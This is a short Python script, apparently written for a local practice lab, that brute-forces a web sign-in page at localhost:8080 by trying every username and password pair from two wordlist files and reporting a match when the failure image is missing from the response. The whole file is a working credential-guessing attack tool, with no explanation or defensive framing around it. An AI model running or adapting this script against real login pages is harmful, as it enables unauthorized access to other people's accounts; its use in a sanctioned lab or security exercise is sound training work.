import requests
import time

def brute_force_login(users, passw):  
    found = False 
    for usr in users:
        for pas in passw:
            url = f"http://localhost:8080/index.php?page=signin&username={usr}&password={pas}&Login=Login#" 
            print(f"Trying '{usr}' and '{pas}'")
            response = requests.get(url)
            time.sleep(0.5)
            if "images/WrongAnswer.gif" not in response.text:
                print(f"Possible breach found.\nCheck username: \033[1;92m{usr}\033[0m and password: \033[1;92m{pas}\033[0m")
                found = True
                break
            else:
                print("Not found")
            print()
        if found:
            break
            

if __name__ == "__main__":
    with open ('usernames.txt', 'r') as file:
        users = [line.strip() for line in file]
        
    with open ('passwords.txt', 'r') as file:
        passw = [line.strip() for line in file]
    
    brute_force_login(users, passw)